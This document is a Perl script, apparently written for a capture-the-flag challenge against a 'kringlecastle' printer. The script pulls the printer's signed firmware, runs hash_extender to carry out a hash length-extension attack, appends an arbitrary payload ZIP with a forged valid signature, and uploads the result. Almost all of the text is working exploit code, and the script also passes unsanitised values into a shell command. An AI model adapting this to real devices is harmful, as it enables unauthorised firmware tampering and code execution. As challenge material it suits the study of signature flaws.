#!/usr/bin/perl
use JSON;
use Getopt::Std;
use MIME::Base64;
use IO::Compress::Zip qw(zip);
use LWP;

$|=1;

if(!getopts("p:")||($opt_p eq "")){
  printf "Usage: %s -p <your payload file>\n",$0;
  printf "The script send the new firmware.json file to STDOUT\n";
}

#
# read the original firmware file
#
printf "Downloading current firmware: ";
my $ua=LWP::UserAgent->new();
my $res=$ua->get('https://printer.kringlecastle.com/firmware/download');
unless($res->is_success){
  die "troubles downloading original firmware from https://printer.kringlecastle.com/firmware/download\n";
}
printf "%s\n",$res->status_line;
my $orig_fw=$res->decoded_content;

#
# decode the JSON structure
#
$orig_fw_dec=decode_json $orig_fw;
#
# field in firmware JSON:
#   firmware ZIP (base64)
#   signature (hex)
#   secret_length
#   algorithm

#
# extract and convert members to desired format (firmware in hex)
#
$fw_hex=unpack "H*",decode_base64($orig_fw_dec->{firmware});
$signature_hex=$orig_fw_dec->{signature};
$secret_length=$orig_fw_dec->{secret_length};

#
# create ZIP file from payload with filename firmware.bin, converted to hex
#
my $buffer;
zip $opt_p => \$buffer, Name => 'firmware.bin';
$nfw_hex=unpack "H*",$buffer;

printf "Patching firmware: ";
#
# call hash_extender to append the payload ZIP to the original firmware ZIP
# including a valid signature
#
open($F,"./hash_extender -d $fw_hex --data-format=hex -s $signature_hex -l $secret_length -a $nfw_hex --append-format=hex |");
my $newfw;
while(<$F>){
  chop;
  if(/New string: (.+)$/){ $newfw->{firmware}=encode_base64((pack "H*",$1),""); }
  if(/New signature: (.+)$/){ $newfw->{signature}=$1; }
  if(/Secret length: (.+)$/){ $newfw->{secret_length}=int($1); }
  if(/Type: (.+)$/){ $newfw->{algorithm}=uc($1); }
}
close $F;
printf "done\n";
$n=encode_json $newfw;

printf "Uploading new firmware: ";

my $res=$ua->post('https://printer.kringlecastle.com/firmware',
                   'Content-Type' => 'form-data',
                    Content => [ "file" => [ undef, "firmware.json", Content => $n, 'Content-Type' => 'application/json' ] ] ) ;
printf "Upload-Status: %s\n",$res->status_line;
if($res->decoded_content=~/green.*>(.*)<\/p>/){
  printf "OK: %s\n",$1;
}elsif($res->decoded_content=~/<pre>(.*)<\/pre>/){
  printf "Failed: %s\n",$1;
}else{
  printf "unknown error: %s\n",$res->decoded_content;
}
